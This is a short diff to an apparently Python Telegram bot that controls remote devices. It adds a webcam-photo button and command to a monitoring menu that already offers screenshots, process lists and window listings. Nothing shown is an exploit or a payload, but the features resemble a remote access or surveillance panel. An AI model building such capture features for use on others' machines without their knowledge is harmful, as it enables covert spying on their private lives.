@@ -154,6 +154,7 @@ def get_device_menu(device_id: str, device_name: str = "ПК"):
 def get_monitoring_menu(device_id):
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📸 Скриншот", callback_data=f"cmd_screen_{device_id}")],
+        [InlineKeyboardButton(text="📷 Фото с веб-камеры", callback_data=f"cmd_webcam_{device_id}")],
         [InlineKeyboardButton(text="📋 Процессы", callback_data=f"cmd_tasklist_{device_id}")],
         [InlineKeyboardButton(text="🪟 Активные окна", callback_data=f"cmd_windows_{device_id}")],
         [InlineKeyboardButton(text="📱 Открытые программы", callback_data=f"cmd_apps_{device_id}")],
@@ -397,6 +398,7 @@ async def send_command(callback: types.CallbackQuery):
     
     cmd_map = {
         "screen": "screen",
+        "webcam": "webcam",
         "tasklist": "tasklist",
         "windows": "windows",
         "apps": "apps",
